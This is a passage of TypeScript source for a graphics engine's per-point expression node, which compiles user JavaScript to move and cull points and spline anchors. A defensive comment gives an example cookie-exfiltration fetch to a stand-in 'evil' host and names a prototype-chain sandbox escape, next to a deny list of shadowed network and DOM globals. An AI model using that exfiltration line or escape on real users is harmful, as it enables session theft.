import type {
  ExprInput,
  InputSocketDef,
  NodeDefinition,
  PointAttribute,
  PointsValue,
  RenderContext,
  SocketType,
  SplineAnchor,
  SplineSubpath,
  SplineValue,
} from "@/engine/types";
import {
  measureSpline,
  sampleSplineAt,
  type SplineLengths,
} from "@/engine/spline-math";

// Point Expression — the per-element field-expression primitive.
//
// The scalar Expression node (expression.ts) evaluates ONCE per frame. This
// node evaluates a JS block ONCE PER POINT over an incoming `points` value,
// so you can compute a point's new position / scale / rotation as a function
// of its own `index` (and `count`, `groupIndex`, current attributes, the
// frame clock, wired uniforms, and — optionally — samples of a guide spline).
//
// This is what lets you rebuild Blender-geometry-nodes "field" graphs: things
// like `curve_id = floor(index/slots)`, `phase = fract(... - frame/600)`,
// index-hashed random windows, exponential easing, and gated hops — none of
// which the bake-based points model could express before.
//
// Env & write model mirror expression.ts as closely as possible:
//   READ per point:  index, count, groupIndex, px, py, rot0, sx0, sy0
//   WRITE per point:  x(=px) y(=py) rot(=rot0) sx(=sx0) sy(=sy0)
//                     scale(=1, uniform mult) keep(=true, cull when falsy)
//   CLOCK/MATH:       t, time, frame, fps, PI, TAU, trig, clamp, lerp,
//                     smoothstep, fract, mod, ... (same whitelist)
//   RANDOM:           rand(seed) — deterministic, frame-INDEPENDENT (index
//                     hashing); random() — per-frame mulberry32 (animated).
//   PATH (optional `path` spline input):
//                     pathCount(), pathLen(sub?), pathPos(factor, sub?),
//                     pathX/pathY/pathAngle(factor, sub?)
//   CHANNELS:         Houdini-style tunables. ch("name", default[, min, max])
//                     returns a slider value (wireable); pick("name", "optA",
//                     "optB", …) returns a dropdown selection string. Both
//                     return the inline default until the control exists. The
//                     panel "Sync" button scans the source for ch(…)/pick(…)
//                     and mints the matching slider / dropdown (rendered via
//                     the standard param control). Because channel names are
//                     STRINGS (never JS identifiers in scope) they can't
//                     collide with built-ins — ch("x") is fine.
//
// The block uses assignments (not `return`). Final scale = sx*scale, sy*scale.
// Points with a falsy `keep` are dropped — count shrinks, matching Blender's
// Delete Geometry (Copy to Points then instances fewer copies).

// Reused from the scalar Expression node: newExprInput (panel "+") is
// re-exported for EffectsApp; newExprInputId mints stable socket keys for
// channels the Sync button discovers.
export { newExprInput } from "./expression";
import { newExprInputId } from "./expression";
import {
  copyPointsWith,
  EMPTY_POINTS,
  gatherAttributes,
  gatherPoints,
  RESERVED_POINT_ATTR_NAMES,
} from "@/engine/points";

// Recompute the cache every frame only when the source is time-dependent —
// same predicate as expression.ts. `rand` is deliberately NOT here (it's
// frame-independent), so an index-hashed-only expression caches statically.
const TIME_RE = /\b(t|time|frame|random)\b/;

const DEFAULT_EXPRESSION = `// read:  index, count, groupIndex, px, py, rot0, sx0, sy0
// write: x, y, rot, sx, sy, scale, keep   (declare temps with let/const)
// channels: attr("name") reads, setattr("name", v) writes — see Spreadsheet
// tunables: ch("name", default) — then hit Sync to make sliders
x = px;
y = py;`;

// ---------------------------------------------------------------------------
// Deterministic hashes (both cache-safe: same inputs → same output).
// ---------------------------------------------------------------------------

function mulberry32(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a |= 0;
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function hashString(s: string): number {
  let h = 2166136261;
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  return h >>> 0;
}

// Frame-independent per-seed hash → [0,1). This is the "Random Value hashed on
// Index" primitive: same seed always yields the same value, so window starts /
// gates stay put across frames (and the node caches statically). triple32
// (Wellons) — strong avalanche on *sequential* integer seeds (0,1,2,…), the
// exact input pattern here. The trailing `>>> 0` keeps it unsigned before the
// divide (a signed result would fold the range into the bottom half).
function hash01(seed: number): number {
  let x = seed >>> 0;
  x ^= x >>> 17;
  x = Math.imul(x, 0xed5ad4bb);
  x ^= x >>> 11;
  x = Math.imul(x, 0xac4c1b51);
  x ^= x >>> 15;
  x = Math.imul(x, 0x31848bab);
  x ^= x >>> 14;
  return (x >>> 0) / 4294967296;
}

// ---------------------------------------------------------------------------
// Path sampling helpers — bound over the wired spline + its measured lengths.
// ---------------------------------------------------------------------------

interface PathEnv {
  pathCount: () => number;
  pathLen: (sub?: number) => number;
  pathPos: (factor: number, sub?: number) => [number, number];
  pathX: (factor: number, sub?: number) => number;
  pathY: (factor: number, sub?: number) => number;
  pathAngle: (factor: number, sub?: number) => number;
}

function makePathEnv(
  spline: SplineValue | null,
  lengths: SplineLengths | null
): PathEnv {
  if (!spline || !lengths || lengths.total <= 0) {
    const zero2: [number, number] = [0, 0];
    return {
      pathCount: () => 0,
      pathLen: () => 0,
      pathPos: () => zero2,
      pathX: () => 0,
      pathY: () => 0,
      pathAngle: () => 0,
    };
  }
  const nSub = lengths.perSubpath.length;
  // Map a per-subpath factor to the global [0,1] t sampleSplineAt expects.
  const globalT = (factor: number, sub?: number): number => {
    const f = factor - Math.floor(factor); // fract → loop
    if (sub === undefined) return f;
    const k = Math.max(0, Math.min(nSub - 1, sub | 0));
    const m = lengths.perSubpath[k];
    if (!m || m.total <= 0) return lengths.offsets[k] / lengths.total;
    return (lengths.offsets[k] + f * m.total) / lengths.total;
  };
  const pathLen = (sub?: number): number => {
    if (sub === undefined) return lengths.total;
    const k = Math.max(0, Math.min(nSub - 1, sub | 0));
    return lengths.perSubpath[k]?.total ?? 0;
  };
  const pathPos = (factor: number, sub?: number): [number, number] =>
    sampleSplineAt(spline, lengths, globalT(factor, sub)).pos;
  return {
    pathCount: () => nSub,
    pathLen,
    pathPos,
    pathX: (factor, sub) => pathPos(factor, sub)[0],
    pathY: (factor, sub) => pathPos(factor, sub)[1],
    pathAngle: (factor, sub) => {
      const tan = sampleSplineAt(spline, lengths, globalT(factor, sub)).tangent;
      return Math.atan2(tan[1], tan[0]);
    },
  };
}

// ---------------------------------------------------------------------------
// Env (built once per frame; constant across points).
// ---------------------------------------------------------------------------

// Named-attribute access (081326_point-attributes.md M2). The functions are
// env keys (fixed shape — the compiled prologue destructures ENV_KEYS), and
// they close over a per-eval cursor the compute loop advances, so the hot
// PointCtx struct stays monomorphic. `attr` reads the SOURCE value's
// channels only — same-pass setattr writes are deliberately not readable,
// so results never depend on point iteration order.
interface AttrEnv {
  attr: (name: string, component?: number) => number;
  setattr: (name: string, value: number) => void;
}
const NO_ATTRS: AttrEnv = { attr: () => 0, setattr: () => {} };

function makeEnv(
  ctx: RenderContext,
  nodeId: string,
  path: PathEnv,
  channels: Record<string, number | string>,
  attrs: AttrEnv
): Record<string, unknown> {
  const M = Math;
  const rng = mulberry32(hashString(nodeId) ^ ((ctx.frame >>> 0) + 0x9e3779b9));
  return {
    // Houdini-style channels: the named control's value if it exists (wired or
    // its slider/dropdown value), else the inline fallback — so the expression
    // is valid before you Sync + create the control. Trailing args to ch()
    // (min, max) are metadata the Sync scanner reads; ignored at eval.
    ch: (name: string, def = 0) => {
      const v = channels[name];
      return typeof v === "number" ? v : Number.isFinite(def) ? def : 0;
    },
    // Dropdown channel — returns the selected option string, else the default.
    pick: (name: string, def = "") => {
      const v = channels[name];
      return typeof v === "string" ? v : def;
    },
    t: ctx.time,
    time: ctx.time,
    frame: ctx.frame,
    fps: ctx.fps,
    PI: M.PI,
    TAU: M.PI * 2,
    E: M.E,
    sin: M.sin,
    cos: M.cos,
    tan: M.tan,
    asin: M.asin,
    acos: M.acos,
    atan: M.atan,
    atan2: M.atan2,
    abs: M.abs,
    sign: M.sign,
    sqrt: M.sqrt,
    cbrt: M.cbrt,
    pow: M.pow,
    exp: M.exp,
    log: M.log,
    log2: M.log2,
    min: M.min,
    max: M.max,
    floor: M.floor,
    ceil: M.ceil,
    round: M.round,
    trunc: M.trunc,
    hypot: M.hypot,
    mod: (a: number, b: number) => (b === 0 ? 0 : a - Math.floor(a / b) * b),
    fract: (x: number) => x - Math.floor(x),
    clamp: (v: number, lo: number, hi: number) =>
      Math.min(Math.max(v, lo), hi),
    saturate: (v: number) => Math.min(Math.max(v, 0), 1),
    lerp: (a: number, b: number, k: number) => a + (b - a) * k,
    mix: (a: number, b: number, k: number) => a + (b - a) * k,
    step: (edge: number, x: number) => (x < edge ? 0 : 1),
    smoothstep: (e0: number, e1: number, x: number) => {
      const d = e1 - e0;
      const k = Math.min(Math.max(d === 0 ? 0 : (x - e0) / d, 0), 1);
      return k * k * (3 - 2 * k);
    },
    rand: (seed: number) => hash01(seed | 0),
    random: () => rng(),
    pathCount: path.pathCount,
    pathLen: path.pathLen,
    pathPos: path.pathPos,
    pathX: path.pathX,
    pathY: path.pathY,
    pathAngle: path.pathAngle,
    attr: attrs.attr,
    setattr: attrs.setattr,
  };
}

const ENV_KEYS = Object.keys(
  makeEnv(
    { time: 0, frame: 0, fps: 60 } as RenderContext,
    "sample",
    makePathEnv(null, null),
    {},
    NO_ATTRS
  )
).join(",");

// The mutable per-point record injected into every call. Reused across points
// (fields overwritten each iteration) so V8 stays monomorphic with zero
// per-point allocation.
interface PointCtx {
  index: number;
  count: number;
  groupIndex: number;
  px: number;
  py: number;
  rot0: number;
  sx0: number;
  sy0: number;
}

// Compiled function: (__env, __pt) → the domain's packed tuple (keep as
// 0/1). The block runs against writable locals initialised from the element;
// we read them back after. Channel inputs are read via ch() from __env, never
// injected as parameters — so nothing user-named lands in the kernel's scope.
type CompiledFn = (env: unknown, pt: unknown) => unknown;

// The kernel's element domain (the Houdini wrangle-context idea): same
// language + env, different per-element contract. Points read/write
// position+scale+rotation; spline anchors read/write position, handle
// offsets, and the width profile.
type ExprTarget = "points" | "spline anchors";

// Packed-tuple length per domain — the call sites check it so a stray user
// `return` keeps the element unchanged instead of smuggling a wrong shape.
function tupleLenFor(target: ExprTarget): number {
  return target === "spline anchors" ? 8 : 7;
}

interface Compiled {
  source: string;
  target: ExprTarget;
  fn: CompiledFn | null;
  error: string | null;
}

interface ExprState {
  compiled?: Compiled;
  error: string | null;
  lastWarned?: string | null;
}

function getState(ctx: RenderContext, nodeId: string): ExprState {
  const key = `point-expression:${nodeId}`;
  let s = ctx.state[key] as ExprState | undefined;
  if (!s) {
    s = { error: null };
    ctx.state[key] = s;
  }
  return s;
}

function warnOnce(state: ExprState, nodeId: string): void {
  if (state.error && state.error !== state.lastWarned) {
    console.warn(`[Point Expression ${nodeId}] ${state.error}`);
  }
  state.lastWarned = state.error;
}

// Defense-in-depth, NOT a sandbox. Expression sources can arrive from
// untrusted places — a shared/opened project, or an AI recipe (the recipe
// validator smoke-runs the kernel, and eval runs it per point). This block
// shadows the network / DOM / storage / async / dynamic-code globals a
// legitimate math kernel never needs, so a naive `fetch("//evil/"+document.cookie)`
// throws a TypeError instead of exfiltrating silently — and the per-point
// try/catch then fails the point safe to passthrough and logs it. This does
// NOT stop a determined escape via prototype chains (`[].constructor.constructor`);
// real isolation (a Worker with a time budget) is the follow-up. Math, JSON,
// Number, String, Array, Object etc. are deliberately left reachable — kernels
// use them. Names here must not be strict-mode-reserved (no `eval`) and must
// not collide with ENV_KEYS or the per-point locals.
const SHADOWED_GLOBALS = [
  "window", "self", "globalThis", "top", "parent", "frames",
  "document", "navigator", "location", "history", "screen",
  "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "Request", "Response",
  "importScripts", "postMessage", "Worker", "SharedWorker",
  "localStorage", "sessionStorage", "indexedDB", "caches", "cookieStore",
  "setTimeout", "setInterval", "setImmediate", "requestAnimationFrame", "queueMicrotask",
  "Function", "process", "require", "module", "exports",
  "alert", "prompt", "confirm", "open",
];
const GLOBAL_SHADOW_PRELUDE = `const ${SHADOWED_GLOBALS.map((g) => `${g}=void 0`).join(",")};`;

function compile(source: string, target: ExprTarget): Compiled {
  const body = source.trim();
  // Per-element locals are declared from __pt; the user's block mutates the
  // writable ones; we return the packed result. A stray `return` in the
  // user block early-exits → the call site detects the wrong shape and
  // keeps the element unchanged. No user-controlled identifiers enter this
  // scope (channels are read via ch()), so there's no collision surface.
  const prologue =
    target === "spline anchors"
      ? `let index=__pt.index,count=__pt.count,subpath=__pt.subpath,groupIndex=__pt.groupIndex,px=__pt.px,py=__pt.py,inx0=__pt.inx0,iny0=__pt.iny0,outx0=__pt.outx0,outy0=__pt.outy0,width0=__pt.width0;
let x=px,y=py,inx=inx0,iny=iny0,outx=outx0,outy=outy0,width=width0,keep=true;`
      : `let index=__pt.index,count=__pt.count,groupIndex=__pt.groupIndex,px=__pt.px,py=__pt.py,rot0=__pt.rot0,sx0=__pt.sx0,sy0=__pt.sy0;
let x=px,y=py,rot=rot0,sx=sx0,sy=sy0,scale=1,keep=true;`;
  const epilogue =
    target === "spline anchors"
      ? `return [x,y,inx,iny,outx,outy,width,keep?1:0];`
      : `return [x,y,sx,sy,scale,rot,keep?1:0];`;
  try {
    const fn = new Function(
      "__env",
      "__pt",
      `"use strict";
${GLOBAL_SHADOW_PRELUDE}
const{${ENV_KEYS}}=__env;
${prologue}
${body}
${epilogue}`
    ) as CompiledFn;
    return { source, target, fn, error: null };
  } catch (e) {
    return {
      source,
      target,
      fn: null,
      error: e instanceof Error ? e.message : String(e),
    };
  }
}

// Scan an expression for channel references so the Sync button can mint the
// matching controls (string-literal names → zero false positives):
//   ch("name", default, min, max)   → scalar slider  (min/max optional)
//   pick("name", "optA", "optB", …) → dropdown (first option is the default)
export interface ChannelRef {
  name: string;
  kind: "scalar" | "enum";
  default?: number | string;
  min?: number;
  max?: number;
  options?: string[];
}

const CH_RE =
  /\bch\s*\(\s*(['"])([A-Za-z_$][\w$]*)\1\s*(?:,\s*(-?\d*\.?\d+(?:[eE][-+]?\d+)?))?\s*(?:,\s*(-?\d*\.?\d+(?:[eE][-+]?\d+)?))?\s*(?:,\s*(-?\d*\.?\d+(?:[eE][-+]?\d+)?))?/g;
const PICK_RE =
  /\bpick\s*\(\s*(['"])([A-Za-z_$][\w$]*)\1\s*((?:,\s*(['"])[^'"]*\4)+)/g;
const STR_LIT_RE = /(['"])([^'"]*)\1/g;

function numOrUndef(s: string | undefined): number | undefined {
  if (s === undefined) return undefined;
  const n = Number(s);
  return Number.isFinite(n) ? n : undefined;
}

export function scanChannelRefs(source: string): ChannelRef[] {
  const out: ChannelRef[] = [];
  const seen = new Set<string>();
  let m: RegExpExecArray | null;

  CH_RE.lastIndex = 0;
  while ((m = CH_RE.exec(source)) !== null) {
    const name = m[2];
    if (seen.has(name)) continue;
    seen.add(name);
    out.push({
      name,
      kind: "scalar",
      default: numOrUndef(m[3]),
      min: numOrUndef(m[4]),
      max: numOrUndef(m[5]),
    });
  }

  PICK_RE.lastIndex = 0;
  while ((m = PICK_RE.exec(source)) !== null) {
    const name = m[2];
    if (seen.has(name)) continue;
    seen.add(name);
    const options: string[] = [];
    let s: RegExpExecArray | null;
    STR_LIT_RE.lastIndex = 0;
    while ((s = STR_LIT_RE.exec(m[3])) !== null) options.push(s[2]);
    out.push({
      name,
      kind: "enum",
      options,
      default: options[0] ?? "",
    });
  }

  return out;
}

// Merge channel references from `source` into an existing input list. Add-only
// (Houdini's "create from channel references"): new channels are appended with
// their inline default + control metadata; existing ones keep their id, wires,
// and user-tuned value. Callers prune with the row × button. Returns the SAME
// array (referentially) when nothing changed, so the panel skips a no-op write.
export function syncChannelInputs(
  existing: ExprInput[],
  source: string
): ExprInput[] {
  const have = new Set(existing.map((e) => e.name));
  const additions: ExprInput[] = [];
  for (const ref of scanChannelRefs(source)) {
    if (have.has(ref.name)) continue;
    have.add(ref.name);
    if (ref.kind === "enum") {
      additions.push({
        id: newExprInputId(),
        name: ref.name,
        default: (ref.default as string) ?? "",
        options: ref.options ?? [],
      });
    } else {
      additions.push({
        id: newExprInputId(),
        name: ref.name,
        default: (ref.default as number) ?? 1,
        ...(ref.min !== undefined ? { min: ref.min } : {}),
        ...(ref.max !== undefined ? { max: ref.max } : {}),
      });
    }
  }
  return additions.length === 0 ? existing : [...existing, ...additions];
}

function toNum(v: unknown, fallback = 0): number {
  const n = typeof v === "number" ? v : Number(v);
  return Number.isFinite(n) ? n : fallback;
}

const EMPTY = EMPTY_POINTS;
const EMPTY_SPLINE: SplineValue = { kind: "spline", subpaths: [] };

// The spline-anchor domain's mutable per-element record — same monomorphic
// reuse discipline as PointCtx. Handle offsets read 0 when absent; width
// reads its render default 1.
interface AnchorCtx {
  index: number;
  count: number;
  subpath: number;
  groupIndex: number;
  px: number;
  py: number;
  inx0: number;
  iny0: number;
  outx0: number;
  outy0: number;
  width0: number;
}

// Run the kernel once per anchor across all subpaths (row order = the
// spreadsheet's). Writes position, handle offsets, width, and `keep`;
// attr() reads anchor channels (falling back to the subpath's), setattr()
// writes float anchor channels. Subpaths whose anchors are all culled drop.
function runAnchorExpression(
  spline: SplineValue,
  fn: CompiledFn,
  ctx: RenderContext,
  nodeId: string,
  pathEnv: PathEnv,
  channels: Record<string, number | string>,
  onErrorZero: boolean,
  state: ExprState
): { primary: SplineValue } {
  let total = 0;
  for (const sub of spline.subpaths) total += sub.anchors.length;
  if (total === 0) return { primary: EMPTY_SPLINE };

  const cursor: { a: SplineAnchor | null; sub: SplineSubpath | null } = {
    a: null,
    sub: null,
  };
  const written = new Map<string, Float32Array>();
  let row = 0;
  const env = makeEnv(ctx, nodeId, pathEnv, channels, {
    attr: (name, component = 0) => {
      const v = cursor.a?.attrs?.[name] ?? cursor.sub?.attrs?.[name];
      const c = component | 0;
      if (typeof v === "number") return c === 0 ? v : 0;
      if (Array.isArray(v)) {
        const x = v[c];
        return typeof x === "number" && Number.isFinite(x) ? x : 0;
      }
      return 0;
    },
    setattr: (name, value) => {
      if (
        typeof name !== "string" ||
        !name ||
        RESERVED_POINT_ATTR_NAMES.has(name)
      ) {
        return;
      }
      let arr = written.get(name);
      if (!arr) {
        arr = new Float32Array(total);
        written.set(name, arr);
      }
      const v = +value;
      arr[row] = Number.isFinite(v) ? v : 0;
    },
  });

  const pt: AnchorCtx = {
    index: 0,
    count: total,
    subpath: 0,
    groupIndex: 0,
    px: 0,
    py: 0,
    inx0: 0,
    iny0: 0,
    outx0: 0,
    outy0: 0,
    width0: 1,
  };

  let runtimeErr = false;
  const outSubpaths: SplineSubpath[] = [];
  // Kept output anchors + the source row each came from, for the setattr
  // merge below (a channel minted late in the loop must still cover
  // earlier rows, so merging can't happen inline).
  const keptAnchors: SplineAnchor[] = [];
  const keptRows: number[] = [];

  for (let s = 0; s < spline.subpaths.length; s++) {
    const sub = spline.subpaths[s];
    const outAnchors: SplineAnchor[] = [];
    for (const a of sub.anchors) {
      const hadIn = a.inHandle !== undefined;
      const hadOut = a.outHandle !== undefined;
      pt.index = row;
      pt.subpath = s;
      pt.groupIndex = sub.groupIndex ?? 0;
      pt.px = a.pos[0];
      pt.py = a.pos[1];
      pt.inx0 = hadIn ? a.inHandle![0] : 0;
      pt.iny0 = hadIn ? a.inHandle![1] : 0;
      pt.outx0 = hadOut ? a.outHandle![0] : 0;
      pt.outy0 = hadOut ? a.outHandle![1] : 0;
      pt.width0 = a.width ?? 1;
      cursor.a = a;
      cursor.sub = sub;

      let x = pt.px;
      let y = pt.py;
      let inx = pt.inx0;
      let iny = pt.iny0;
      let outx = pt.outx0;
      let outy = pt.outy0;
      let width = pt.width0;
      let keep = true;
      try {
        const raw = fn(env, pt);
        if (Array.isArray(raw) && raw.length === 8) {
          x = toNum(raw[0], pt.px);
          y = toNum(raw[1], pt.py);
          inx = toNum(raw[2], pt.inx0);
          iny = toNum(raw[3], pt.iny0);
          outx = toNum(raw[4], pt.outx0);
          outy = toNum(raw[5], pt.outy0);
          width = toNum(raw[6], pt.width0);
          keep = !!raw[7];
        }
      } catch (e) {
        if (!runtimeErr) {
          state.error = e instanceof Error ? e.message : String(e);
          warnOnce(state, nodeId);
          runtimeErr = true;
        }
        if (onErrorZero) {
          x = 0;
          y = 0;
          inx = 0;
          iny = 0;
          outx = 0;
          outy = 0;
          width = 0;
        }
        // passthrough (default): originals stand.
      }

      if (!keep) {
        row++;
        continue;
      }
      const na: SplineAnchor = {
        ...a,
        pos: [x, y],
        // A handle exists on output if it existed on input OR the kernel
        // moved it off zero — so plain corner anchors stay corners.
        inHandle: hadIn || inx !== 0 || iny !== 0 ? [inx, iny] : undefined,
        outHandle:
          hadOut || outx !== 0 || outy !== 0 ? [outx, outy] : undefined,
        width: width === 1 && a.width === undefined ? undefined : width,
      };
      outAnchors.push(na);
      keptAnchors.push(na);
      keptRows.push(row);
      row++;
    }
    if (outAnchors.length > 0) {
      outSubpaths.push({ ...sub, anchors: outAnchors });
    }
  }

  if (written.size > 0) {
    for (let k = 0; k < keptAnchors.length; k++) {
      const merged: Record<string, number | number[]> = {
        ...keptAnchors[k].attrs,
      };
      for (const [name, buf] of written) merged[name] = buf[keptRows[k]];
      keptAnchors[k].attrs = merged;
    }
  }

  if (!runtimeErr) {
    state.error = null;
    state.lastWarned = null;
  }
  return { primary: { kind: "spline", subpaths: outSubpaths } };
}

export const pointExpressionNode: NodeDefinition = {
  type: "point-expression",
  name: "Point Expression",
  category: "point",
  subcategory: "modifier",
  description:
    "Run a JavaScript expression once per point to compute its new position, " +
    "scale, and rotation from its own `index` (and `count`, `groupIndex`, " +
    "current px/py/rot0/sx0/sy0, the `frame`/`t` clock, and wired uniforms). " +
    "Set `keep=false` to cull a point. Wire a spline into `path` to sample " +
    "guide curves with pathPos(factor, sub) / pathLen(sub) / pathAngle(...). " +
    "Deterministic rand(seed) hashes on index for stable per-point randomness; " +
    "random() varies per frame. attr(\"name\") reads a named point channel " +
    "(attr(\"name\", c) for a component) and setattr(\"name\", v) writes a " +
    "float channel — inspect them in the Spreadsheet panel. " +
    "Target switches the element domain: `spline anchors` runs the code " +
    "once per anchor instead (read px/py, handle offsets inx0/iny0/" +
    "outx0/outy0, width0, subpath; write x, y, inx, iny, outx, outy, " +
    "width, keep). " +
    "Mark tunables with ch(\"name\", default) " +
    "(sliders) or pick(\"name\", \"optA\", \"optB\") (dropdowns) and hit Sync to " +
    "turn them into standard controls you can drive. Every ch() channel is " +
    "also a wireable scalar input socket addressed by its channel name — " +
    "e.g. with ch(\"speed\", 600) in the expression, wire an LFO or audio " +
    "level into the `speed` input to drive it. This is the per-element " +
    "field primitive — the per-point counterpart to the once-per-frame " +
    "Expression node.",
  backend: "webgl2",
  // Pure CPU eval. fingerprintExtras folds ctx.time in only when the source is
  // time-dependent, so static per-point expressions cache as constants.
  stable: true,
  noMaskInput: true,
  inputs: [
    { name: "points", type: "points", required: true },
    { name: "path", type: "spline", required: false },
  ],
  resolveInputs(params): InputSocketDef[] {
    const entries = (params.inputs as ExprInput[]) ?? [];
    const target = ((params.target as string) ??
      "points") as ExprTarget;
    return [
      {
        name: "points",
        type: target === "spline anchors" ? "spline" : "points",
        required: true,
        label: target === "spline anchors" ? "Spline" : "Points",
      },
      { name: "path", type: "spline", required: false, label: "Path" },
      // Scalar (ch) channels get a wireable socket; enum (pick) channels are
      // panel-only dropdowns.
      ...entries
        .filter((e) => !e.options)
        .map<InputSocketDef>((e) => ({
          name: `in:${e.id}`,
          label: e.name,
          type: "scalar",
          required: false,
        })),
    ];
  },
  params: [
    {
      name: "target",
      label: "Target",
      type: "enum",
      options: ["points", "spline anchors"],
      default: "points",
    },
    {
      name: "inputs",
      label: "Channels",
      type: "expr_inputs",
      default: [],
      // Show the "Sync" button: scan the expression for ch(…) calls and mint
      // the matching sliders. Read `expression` (the sibling param) for the
      // source. Channels are read via ch("name") — never bare variables — so
      // no name can collide with a built-in.
      channelSync: true,
    },
    {
      name: "expression",
      label: "Expression",
      type: "string",
      multiline: true,
      default: DEFAULT_EXPRESSION,
    },
    {
      name: "on_error",
      label: "On error",
      type: "enum",
      options: ["passthrough", "zero"],
      default: "passthrough",
    },
  ],
  primaryOutput: "points",
  resolvePrimaryOutput(params): SocketType {
    return ((params.target as string) ?? "points") === "spline anchors"
      ? "spline"
      : "points";
  },
  auxOutputs: [],

  compute({ inputs, params, ctx, nodeId }) {
    const target = ((params.target as string) ?? "points") as ExprTarget;
    const srcIn = inputs.points;

    const entries = (params.inputs as ExprInput[]) ?? [];
    const source = (params.expression as string) ?? "";
    const onErrorZero = (params.on_error as string) === "zero";

    const state = getState(ctx, nodeId);
    if (
      !state.compiled ||
      state.compiled.source !== source ||
      state.compiled.target !== target
    ) {
      state.compiled = compile(source, target);
      state.error = state.compiled.error;
      warnOnce(state, nodeId);
    }
    const fn = state.compiled.fn;

    // Channel values by name. Enum (pick) channels carry a selected string and
    // have no socket; scalar (ch) channels take the wired scalar if present,
    // else the slider default. Read in the expression via ch()/pick().
    const channels: Record<string, number | string> = {};
    for (const e of entries) {
      if (e.options) {
        channels[e.name] =
          typeof e.default === "string" ? e.default : (e.options[0] ?? "");
      } else {
        const sock = inputs[`in:${e.id}`];
        channels[e.name] =
          sock && sock.kind === "scalar"
            ? sock.value
            : typeof e.default === "number"
              ? e.default
              : 0;
      }
    }

    // Path env (measured once per frame).
    const pathSrc =
      inputs.path && inputs.path.kind === "spline" ? inputs.path : null;
    const pathEnv = makePathEnv(
      pathSrc,
      pathSrc ? measureSpline(pathSrc) : null
    );

    if (target === "spline anchors") {
      if (!srcIn || srcIn.kind !== "spline" || srcIn.subpaths.length === 0) {
        return { primary: EMPTY_SPLINE };
      }
      // Compile error (or empty) → pass the spline through untouched.
      if (!fn) return { primary: srcIn };
      return runAnchorExpression(
        srcIn,
        fn,
        ctx,
        nodeId,
        pathEnv,
        channels,
        onErrorZero,
        state
      );
    }

    const src = srcIn;
    if (!src || src.kind !== "points" || src.count === 0) {
      return { primary: EMPTY };
    }
    // Compile error (or empty) → pass the points through untouched.
    if (!fn) return { primary: src };
    const n = src.count;
    // attr/setattr close over a cursor the loop advances. Writes land in
    // full-length buffers (compacted with keptMap below); reads see the
    // SOURCE value only, so results never depend on iteration order.
    const cursor = { i: 0 };
    const written = new Map<string, Float32Array>();
    const srcAttrs = src.attributes;
    const env = makeEnv(ctx, nodeId, pathEnv, channels, {
      attr: (name, component = 0) => {
        const a = srcAttrs?.[name];
        if (!a) return 0;
        const c = Math.max(0, Math.min(a.arity - 1, component | 0));
        return a.data[cursor.i * a.arity + c];
      },
      setattr: (name, value) => {
        if (
          typeof name !== "string" ||
          !name ||
          RESERVED_POINT_ATTR_NAMES.has(name)
        ) {
          return;
        }
        let arr = written.get(name);
        if (!arr) {
          arr = new Float32Array(n);
          written.set(name, arr);
        }
        const v = +value;
        arr[cursor.i] = Number.isFinite(v) ? v : 0;
      },
    });
    const inPos = src.positions;
    const inScales = src.scales;
    const inRots = src.rotations;
    const inGroups = src.groupIndices;

    const outPos = new Float32Array(n * 2);
    const outScales = new Float32Array(n * 2);
    const outRots = new Float32Array(n);
    const outGroups = inGroups ? new Int32Array(n) : undefined;
    // Source index of each kept row — the gather map for channels the
    // kernel doesn't compute (z/normals, future attributes).
    const keptMap = new Int32Array(n);
    let kept = 0;
    let runtimeErr = false;

    const pt: PointCtx = {
      index: 0,
      count: n,
      groupIndex: 0,
      px: 0,
      py: 0,
      rot0: 0,
      sx0: 1,
      sy0: 1,
    };

    for (let i = 0; i < n; i++) {
      const px = inPos[i * 2];
      const py = inPos[i * 2 + 1];
      const sx0 = inScales ? inScales[i * 2] : 1;
      const sy0 = inScales ? inScales[i * 2 + 1] : 1;
      const rot0 = inRots ? inRots[i] : 0;
      pt.index = i;
      cursor.i = i;
      pt.groupIndex = inGroups ? inGroups[i] : 0;
      pt.px = px;
      pt.py = py;
      pt.rot0 = rot0;
      pt.sx0 = sx0;
      pt.sy0 = sy0;

      let x = px;
      let y = py;
      let sxOut = sx0;
      let syOut = sy0;
      let rotOut = rot0;
      let keep = true;
      try {
        const raw = fn(env, pt);
        // Only the compiled epilogue's packed 7-tuple counts as a result. A
        // user `return` replaces it — and a returned shorter array (e.g.
        // `return [x, y]`) would leave raw[6] undefined and cull EVERY point
        // — so anything else keeps the point as-is.
        if (Array.isArray(raw) && raw.length === 7) {
          x = toNum(raw[0], px);
          y = toNum(raw[1], py);
          const sx = toNum(raw[2], sx0);
          const sy = toNum(raw[3], sy0);
          const scale = toNum(raw[4], 1);
          sxOut = sx * scale;
          syOut = sy * scale;
          rotOut = toNum(raw[5], rot0);
          keep = !!raw[6];
        }
      } catch (e) {
        if (!runtimeErr) {
          state.error = e instanceof Error ? e.message : String(e);
          warnOnce(state, nodeId);
          runtimeErr = true;
        }
        if (onErrorZero) {
          x = 0;
          y = 0;
          sxOut = 0;
          syOut = 0;
          rotOut = 0;
        }
        // passthrough (default): leave x/y/scale/rot at the point's originals.
      }

      if (!keep) continue;
      outPos[kept * 2] = x;
      outPos[kept * 2 + 1] = y;
      outScales[kept * 2] = sxOut;
      outScales[kept * 2 + 1] = syOut;
      outRots[kept] = rotOut;
      if (outGroups) outGroups[kept] = pt.groupIndex;
      keptMap[kept] = i;
      kept++;
    }

    if (!runtimeErr) {
      state.error = null;
      state.lastWarned = null;
    }

    if (kept === 0) return { primary: EMPTY };

    // The kernel computed positions/scales/rotations/groups; everything it
    // doesn't know about (z/normals, other channels) carries from the
    // source — whole when nothing was culled, gathered by keptMap
    // otherwise. setattr results overlay the carried channels last, so a
    // same-name write wins.
    let writtenAttrs: Record<string, PointAttribute> | undefined;
    if (written.size > 0) {
      writtenAttrs = {};
      for (const [name, data] of written) {
        writtenAttrs[name] = { arity: 1, data };
      }
    }
    let out: PointsValue;
    if (kept === n) {
      out = copyPointsWith(src, {
        positions: outPos,
        scales: outScales,
        rotations: outRots,
        groupIndices: outGroups,
        ...(writtenAttrs
          ? { attributes: { ...src.attributes, ...writtenAttrs } }
          : {}),
      });
    } else {
